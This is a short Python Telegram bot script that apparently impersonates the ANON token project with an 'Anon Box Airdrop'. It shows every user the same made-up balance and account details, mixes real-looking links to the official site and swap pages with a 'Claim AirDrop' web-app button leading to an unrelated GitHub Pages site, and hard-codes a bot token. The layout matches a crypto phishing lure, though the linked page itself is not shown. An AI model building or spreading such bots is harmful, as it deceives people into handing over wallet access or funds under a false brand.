from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackContext

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    
    # The first message is just text.
    first_message = "Welcome to the Anon Box Airdrop event!"
    await context.bot.send_message(chat_id=chat_id, text=first_message)

    # Button Claim AirDrop
    claim_airdrop_button = InlineKeyboardButton("Claim AirDrop", web_app=WebAppInfo(url='https://ni77ua.github.io/n1telegbots/'))
    claim_airdrop_markup = InlineKeyboardMarkup([[claim_airdrop_button]])

    # The second message is text with links and an image.
    second_message = (
        "Learn more about our project:\n"
        "[Official site](https://anon.tg/)\n"
        
    )

    # Creating buttons for the second message
    dedust_button = InlineKeyboardButton("DeDust.io", url='https://dedust.io/swap/TON/ANON')
    stonfi_button = InlineKeyboardButton("STON.Fi", url='https://app.ston.fi/swap?chartVisible=false&ft=TON&tt=ANON')
    second_message_markup = InlineKeyboardMarkup([[dedust_button, stonfi_button]])

    await context.bot.send_photo(chat_id=chat_id, photo='https://i.postimg.cc/KzP3LtTT/goraffle.jpg', caption=second_message, parse_mode=ParseMode.MARKDOWN, reply_markup=second_message_markup)

    # Third message - balance and information
    balance_message = """Your balance: 73.22 $ANON

You can transfer your tokens to another user using the command /transfer @username amount.
ID: 2040212139
Registration Date: 2024-06-28T08:25:34.654Z
Invited By: null"""
    await context.bot.send_message(chat_id=chat_id, text=balance_message, reply_markup=claim_airdrop_markup)

    # Fourth message - text with buttons and GIF
    caption = """Coin our exciting event - the Anon Box Airdrop! 
What's inside Anon Box?
- Valuable NFTs from our partners
- $ANON tokens and other cryptocurrencies
- Unique prizes and surprises

Date and Time:
The airdrop has already started! Stay updated to not miss your rewards.
Benefits:
- Exclusive rights and privileges for future ANON missions
- Monthly rewards for ANON Pass holders

Stay anonymous and get ready for new surprises with ANON!"""

    # Creating buttons
    keyboard = [
        [InlineKeyboardButton("Official site", url='https://anon.tg/')],
        [InlineKeyboardButton("Claim AirDrop", web_app=WebAppInfo(url='https://ni77ua.github.io/n1telegbots/'))],
    
        ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    # GIF with a description and buttons
    await context.bot.send_animation(chat_id=chat_id, animation='https://i.postimg.cc/g0G1Hs9q/888-ezgif-com-resize-gif.gif', caption=caption, reply_markup=reply_markup)

# Вставьте ваш токен
application = Application.builder().token("7220018530:AAGgWgbKZYlMiH_CsYXXiVp8gH_W-HfRmCw").build()
application.add_handler(CommandHandler("start", start))
application.run_polling()

